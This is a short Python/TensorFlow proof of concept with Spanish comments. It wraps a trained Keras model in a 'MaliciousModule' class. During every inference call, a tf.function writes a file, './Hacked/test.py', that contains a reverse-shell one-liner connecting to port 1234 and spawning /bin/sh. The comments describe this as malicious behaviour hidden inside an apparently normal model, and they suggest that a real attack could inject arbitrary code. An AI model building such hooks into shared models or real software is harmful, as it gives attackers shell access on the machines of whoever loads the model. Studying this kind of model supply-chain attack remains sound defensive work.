import tensorflow as tf




class MaliciousModule(tf.keras.Model):
    """
    Ejemplo de un módulo Keras que, además de realizar inferencias,
    ejecuta una acción maliciosa (en este caso, escritura en disco).

    """
    def __init__(self, safe_model):
        """
        Constructor que recibe un modelo legítimo ya entrenado
        y lo encapsula dentro de un módulo "malicioso".
        """
        super(MaliciousModule, self).__init__()
        self.model = safe_model

    @tf.function(
        input_signature=[tf.TensorSpec(shape=(None, 224, 224, 3), dtype=tf.float32)]
    )
    def call(self, x):
        """
        Lógica principal de inferencia del modelo.

        Pasos:
        1. Realiza la predicción normal usando el modelo legítimo.
        2. Como efecto lateral, escribe un archivo marcador en disco
           (este sería el comportamiento malicioso).
        3. Devuelve el resultado de la predicción.

        Nota: En un ataque real, en lugar de escribir un marcador, 
        se podría inyectar código arbitrario.
        """
        # Logica de la predicción normal
        res = self.model(x)

        # Escribe un archivo malicioso en el sistema de archivos
        tf.io.write_file(
            "./Hacked/test.py",
            'def reverse_shell(): import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("localhost",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]); reverse_shell()',
        )
        # Devuelve la predicción legítima
        return res
